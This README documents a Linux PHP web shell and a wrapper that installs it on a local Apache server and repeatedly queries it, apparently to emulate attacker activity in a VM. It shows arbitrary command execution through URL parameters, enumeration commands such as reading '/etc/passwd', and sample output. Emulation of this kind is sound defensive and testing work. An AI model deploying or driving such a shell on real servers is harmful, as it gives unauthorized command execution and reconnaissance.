# README for the Linux PHP web shell

This web shell is based on [Simple_PHP_Backdoor_by_DK](https://github.com/xl7dev/WebShell/blob/master/Php/Simple_PHP_backdoor_by_DK.php) (2006).

* **Attempting to download the original file or view its "Raw" source in Github is likely to be flagged and blocked by your organization's internal security tools. This is generally true for the entire xl7dev/WebShell repository.**
* **It is recommended that you not run any web shells outside of a virtual machine.**

## Prerequisites

* OS: Ubuntu 20.04 or 22.04 LTS
  * The webs hell was tested on Ubuntu 22.04 LTS, but any recent version should work.

The following steps will give you an unsecured, minimal web server with default settings.

* You will install the following packages:
  * apache2
  * php
  * libapache2-mod-php
  * net-tools (which provides `arp`)
  * curl (to test web requests to the server)

1. Install all of the packages listed above.
  * `sudo apt-get install apache2 php libapache2-mod-php net-tools`
2. Make sure that you can visit `http://localhost:80` in your browser.
3. Verify that Apache is allowed by Ubuntu's firewall, `ufw`:

```
$ sudo ufw app list
Available applications:
  Apache
  Apache Full
  Apache Secure
  # ...other items skipped...
```

### Limitations

* This web shell can only connect to `localhost`.
* This web shell does not support HTTPS connections.
* The actual web server with PHP is provided by `apache2`, not the wrapper.

## Executing the Web shell Directly

* Copy `simpleshell.php` to `/var/www/html`:

```
sudo cp simpleshell.php /var/www/html/simpleshell.php
```

The starting location of this file will vary:
* If you received an archive: `build\linux\simpleshell.php` in the extracted archive
* If you checked out the repo: `src\webshell\phpwebshell\phpwebshell\simpleshell.php`

The web shell can execute arbitrary commands (though not all commands will work):
* `cmd`: The executable to run.
* `opts`: Any options to pass to the executable. No post-processing is done on this, so any spaces must be included in the argument.

The parameters are assembled into the command with one space between them, then executed.
```
$cmd $options
```

**This web shell runs with the usually limited privileges of the Apache user (e.g., `www-data`). Some privileged commands will not work.**

### Executing the Web shell - Browser

* In a browser, type `http://localhost/simpleshell.php?cmd=uname&opts=-a`.

The web shell will print its output to the page. It will be similar to this:
```
Linux devhost 5.15.0-30-generic #31-Ubuntu SMP Thu May 5 10:00:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

This example ran the `uname -a` command.

### Executing the Web shell - GET request

* In a shell, use a GET request to send the command with `curl`.
  * Make sure that the URL is surrounded by single quotes.

```
curl -X GET 'http://localhost/simpleshell.php?cmd=uname&opts=-a'
```

This time, because you are getting the raw response, you see the `<pre></pre>` HTML tags in the output.
```
<pre>Linux devhost 5.15.0-30-generic #31-Ubuntu SMP Thu May 5 10:00:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
</pre>
```

### Pre-set Enumeration Commands

Using these pre-set URL commands will execute simple host enumeration and discovery tasks:

| Variable | Actual command | Purpose | URL to use |
| -------- | -------------- | ------- | ----------- |
| `whoami` | `whoami`       | Get current username | `http://localhost/simpleshell.php?whoami` |
| `uname`  | `uname -a`     | OS information | `http://localhost/simpleshell.php?uname` |
| `arp`    | `arp -a`       | Network enumeration | `http://localhost/simpleshell.php?arp` |
| `passwd` | `cat /etc/passwd` | Credential enumeration - shows the contents of `/etc/passwd`. | `http://localhost/simpleshell.php?passwd` |

**If you are using curl, remember to enclose the URLs in single quotes!**

### Troubleshooting

**If you do not have `net-tools` installed, `arp` will return nothing.** If you were to execute `arp -a` in the shell directly, it would warn you that arp's package was not installed.

## The PHP Web shell Wrapper

The `wrapper_php` executable manages the following:
* Copying `simpleshell.php` into `/var/www/html` (the source file and destination file paths are configurable).
* Starting and stopping the apache2 web server on its default port 80.
* Running a client that executes random commands from the "Pre-set Enumeration Commands" against the host.

## The PHP Web shell Wrapper - Executing the Web shell

The `wrapper_php` web shell must be started with sudo and use a root `/bin/bash` shell.
The command passed to the root shell must be enclosed in single quotes, and the command
flags for `wrapper_php` must be enclosed in double quotes.

In this example, `wrapper_php` is in a mounted VMWare shared folder under `/mnt/hgfs`.

### Wrapper Options Flags

This application uses `systemctl` commands, which require elevated privileges.
You must start the executable in a root shell:

```
$ sudo -u root -i /bin/bash -c '<path to executable>/wrapper_php <flags>`
```

**You must use absolute paths for `shellSrc`.** This is necessary because the
root user's home directory is the working directory in this context, not
your normal user's home directory.

If your `shellDest` is not the default, you should also use an absolute path
for the same reason.

The full list of options - use `-h` to see a summary of these:

* `-commandTimeDelay`: Time in seconds between running commands.
   * Type: An integer (not in double quotes).
   * Default: `10`
* `-loopTimeDelay`: Time in seconds between looping back through commands.
   * Type: An integer (not in double quotes).
   * Default: `20`
* `-port`: Client will connect to the server on localhost with this port.
    * Type: String (must be in double quotes).
    * Default: `"80"`
    * Do not set this unless your localhost Apache server uses a non-default port!
* `-runTime`: Time in seconds to run web shell for (`0` to run forever).
    * Type: An integer (not in double quotes).
    * Default: `120`
* `-shellDest`: Web shell will be copied here.
    * Type: String (must be in double quotes).
    * Default: `"/var/www/html/simpleshell.php"`
    * Set this if your web server's content is in a different place.
      * The last element of this path is used as the name
        of the script in the URL that the wrapper sends commands to.
         * Example: `/var/www/html/simpleshell.php` becomes
           `http://localhost:80/simpleshell.php`.
* `-shellSrc`: Location to copy web shell from. 
    * Type: String (must be in double quotes).
    * Default: `"simpleshell.php"`
      * Relative to location of `wrapper_php`.
      * In practice, because the application must be run as root,
        the default does not work. This flag always needs to be
        specified by the user as an absolute path, and will be
        different depending on the username and file system layout.

### Example Flags and Output

In these examples:

* The `src/webshell` directory is mounted as a shared folder in the VM.
* Both of these examples are executed in a Linux VM inside the `src/webshell/build` directory.

#### Example Flags and Output - Client Command Output

This section demonstrates sample output from the client's commands sent as requests to the server.

Startup output:
```
$ sudo -u root -i /bin/bash -c '/mnt/hgfs/webshell/build/linux/wrapper_php -shellSrc="/mnt/hgfs/webshell/build/linux/simpleshell.php" -runTime=0 -port="80"'
2022/05/31 11:13:28 Wrapper will run with these options: -shellSrc: /mnt/hgfs/webshell/build/linux/simpleshell.php, -shellDest: /var/www/html/simpleshell.php, -port: 80, -runTime: 0, -commandTimeDelay: 10, -loopTimeDelay: 20
2022/05/31 11:13:28 Copied webshell /mnt/hgfs/webshell/build/linux/simpleshell.php to /var/www/html/simpleshell.php.
2022/05/31 11:13:28 Server started.
2022/05/31 11:13:28 Server will run until stopped with Ctrl+C.
2022/05/31 11:13:28 Starting client.
```

Output for `whoami`:
```
2022/05/31 11:13:28 Connecting to extension: "whoami"
2022/05/31 11:13:28 url: http://localhost:80/simpleshell.php?whoami
2022/05/31 11:13:28 Response:
www-data

```

Output for `uname`:
```
2022/05/31 11:13:38 Connecting to extension: "uname"
2022/05/31 11:13:38 url: http://localhost:80/simpleshell.php?uname
2022/05/31 11:13:38 Response:
Linux devhost 5.15.0-33-generic #34-Ubuntu SMP Wed May 18 13:34:26 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

```

Output for `arp`:
```
2022/05/31 11:13:48 Connecting to extension: "arp"
2022/05/31 11:13:48 url: http://localhost:80/simpleshell.php?arp
2022/05/31 11:13:48 Response:
_gateway (192.168.23.2) at 00:50:56:ea:7a:2b [ether] on ens33
```

Output for `passwd`, cut down for length:
```
2022/05/31 11:13:58 Connecting to extension: "passwd"
2022/05/31 11:13:58 url: http://localhost:80/simpleshell.php?passwd
2022/05/31 11:13:58 Response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...Omitted for length...
gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
dev:x:1000:1000:dev,,,:/home/dev:/bin/bash
```

#### Example Flags and Output - Controlling runTime

With `runTime` > 0, the server quits after runTime elapses.
```
sudo -u root -i /bin/bash -c '/mnt/hgfs/webshell/build/linux/wrapper_php -shellSrc="/mnt/hgfs/webshell/build/linux/simpleshell.php" -runTime=30'
[sudo] password for dev: 
2022/05/26 15:48:15 Copied webshell /mnt/hgfs/webshell/build/linux/simpleshell.php to /var/www/html/simpleshell.php.
2022/05/26 15:48:15 Server started.
2022/05/26 15:48:15 Server will run for 30 seconds.
# ... output omitted
2022/05/26 15:48:45 Attempted to stop server with systemctl.
2022/05/26 15:48:45 Finished.
```

With a `runTime` of 0, the server runs until the user sends Ctrl+C to the console.
```
$ sudo -u root -i /bin/bash -c '/mnt/hgfs/webshell/build/linux/wrapper_php -shellSrc="/mnt/hgfs/webshell/build/linux/simpleshell.php" -runTime=0'
2022/05/26 15:55:08 Copied webshell /mnt/hgfs/webshell/build/linux/simpleshell.php to /var/www/html/simpleshell.php.
2022/05/26 15:55:08 Server started.
2022/05/26 15:55:08 Server will run until stopped with Ctrl+C.

^C2022/05/26 15:56:15 Kill signal received. Attempting to stop web server.
2022/05/26 15:56:15 Attempted to stop server with systemctl.
2022/05/26 15:56:15 Finished.
```

### Customizing the Executables

The behavior of the executable can be further tailored by modifying the variables used by the build scripts and then rebuilding the project from source.

Refer to [Customizing the Executables](BUILD_linux_php_webshell.md#Customizing-The-Executables) in the building document for more details.
